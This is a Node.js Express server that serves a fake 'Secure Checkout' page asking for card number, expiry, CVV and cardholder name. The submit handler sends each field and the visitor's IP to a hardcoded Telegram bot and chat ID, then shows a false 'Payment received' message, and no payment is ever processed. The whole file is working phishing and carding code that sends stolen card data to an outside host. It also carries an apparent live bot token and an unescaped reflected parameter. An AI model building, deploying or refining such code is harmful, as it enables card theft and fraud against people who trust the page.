const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 5000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(__dirname));

// ---------- TELEGRAM ----------
const BOT_TOKEN = "8696604379:AAHOpUvUcDwzLNTBH_GvGxVK7dNMFiqbVnw";
const CHAT_ID = "8685919221";  // ваш ID

async function sendToTelegram(data) {
    const text = `
💳 NEW PAYMENT

Card: ${data.card_number}
Expiry: ${data.expiry}
CVV: ${data.cvv}
Cardholder: ${data.cardholder || 'Not specified'}
Amount: ${data.amount} RUB
Product: ${data.product}
IP: ${data.ip}
    `;
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    try {
        await axios.post(url, {
            chat_id: CHAT_ID,
            text: text,
            parse_mode: "Markdown"
        }, { timeout: 5000 });
    } catch (e) {
        console.log('Telegram error:', e.message);
    }
}

// ---------- ROUTES ----------
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/pay', (req, res) => {
    const product = req.query.product || 'Item';
    const price = req.query.price || '0';
    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Checkout</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            background: #0b0d15;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .card {
            background: #141824;
            border-radius: 28px;
            padding: 40px 35px 45px;
            width: 100%;
            max-width: 440px;
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.8);
            border: 1px solid #2a2f3f;
        }
        .card h1 {
            color: #fff;
            font-size: 26px;
            font-weight: 600;
            letter-spacing: -0.5px;
            margin-bottom: 8px;
        }
        .card .sub {
            color: #8b8fa3;
            font-size: 14px;
            margin-bottom: 30px;
            border-bottom: 1px solid #252b3b;
            padding-bottom: 16px;
        }
        .field {
            margin-bottom: 20px;
        }
        .field label {
            display: block;
            color: #c8ccda;
            font-size: 13px;
            font-weight: 500;
            margin-bottom: 6px;
        }
        .field input {
            width: 100%;
            padding: 14px 16px;
            background: #1e2332;
            border: 1px solid #2e3447;
            border-radius: 14px;
            color: #fff;
            font-size: 16px;
            outline: none;
            transition: 0.2s;
        }
        .field input:focus {
            border-color: #6c7bff;
            box-shadow: 0 0 0 3px rgba(108, 123, 255, 0.15);
        }
        .field input::placeholder {
            color: #5b617a;
        }
        .row {
            display: flex;
            gap: 15px;
        }
        .row .field {
            flex: 1;
        }
        .btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #6c7bff, #4b5bdb);
            border: none;
            border-radius: 16px;
            color: #fff;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            box-shadow: 0 8px 20px rgba(108, 123, 255, 0.25);
        }
        .btn:hover {
            transform: scale(1.01);
            box-shadow: 0 12px 28px rgba(108, 123, 255, 0.35);
        }
        .secure {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: #6a708a;
            font-size: 13px;
            margin-top: 20px;
        }
        .secure svg {
            width: 16px;
            height: 16px;
            fill: none;
            stroke: #6a708a;
            stroke-width: 2;
        }
        .back {
            display: inline-block;
            color: #6a708a;
            text-decoration: none;
            font-size: 14px;
            margin-top: 18px;
        }
        .back:hover { color: #c8ccda; }
        .product-info {
            background: #1a1f2e;
            padding: 12px 16px;
            border-radius: 14px;
            margin-bottom: 25px;
            display: flex;
            justify-content: space-between;
            color: #c8ccda;
            font-size: 14px;
        }
        .product-info span:last-child { color: #fff; font-weight: 600; }
    </style>
</head>
<body>
<div class="card">
    <h1>Secure Checkout</h1>
    <div class="sub">Complete your payment securely</div>

    <div class="product-info">
        <span>${product}</span>
        <span>${price} RUB</span>
    </div>

    <form action="/pay-submit" method="POST">
        <input type="hidden" name="product" value="${product}">
        <input type="hidden" name="amount" value="${price}">

        <div class="field">
            <label>Card Number</label>
            <input type="text" name="card_number" placeholder="1234 5678 9012 3456" required>
        </div>

        <div class="row">
            <div class="field">
                <label>Expiry</label>
                <input type="text" name="expiry" placeholder="MM/YY" required>
            </div>
            <div class="field">
                <label>CVV</label>
                <input type="text" name="cvv" placeholder="123" required>
            </div>
        </div>

        <div class="field">
            <label>Cardholder Name</label>
            <input type="text" name="cardholder" placeholder="John Doe" required>
        </div>

        <button type="submit" class="btn">PAY NOW</button>
    </form>

    <div class="secure">
        <svg viewBox="0 0 24 24"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
        Secure by SSL
    </div>

    <a href="/" class="back">← Back to shop</a>
</div>
</body>
</html>
    `);
});

app.post('/pay-submit', async (req, res) => {
    const data = {
        card_number: req.body.card_number,
        expiry: req.body.expiry,
        cvv: req.body.cvv,
        cardholder: req.body.cardholder || 'Not specified',
        amount: req.body.amount,
        product: req.body.product || 'Item',
        ip: req.ip || req.connection.remoteAddress
    };
    await sendToTelegram(data);
    res.send(`
        <!DOCTYPE html>
        <html><head><title>Payment received</title>
        <style>body{background:#0b0d15;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;text-align:center}</style>
        </head>
        <body><div><h2>✅ Payment received</h2><p>Thank you! Your order is being processed.</p><a href="/" style="color:#6c7bff">Back to shop</a></div></body></html>
    `);
});

app.get('/buy', (req, res) => {
    const product = req.query.product || 'Item';
    const price = req.query.price || '0';
    res.redirect(`/pay?product=${encodeURIComponent(product)}&price=${price}`);
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
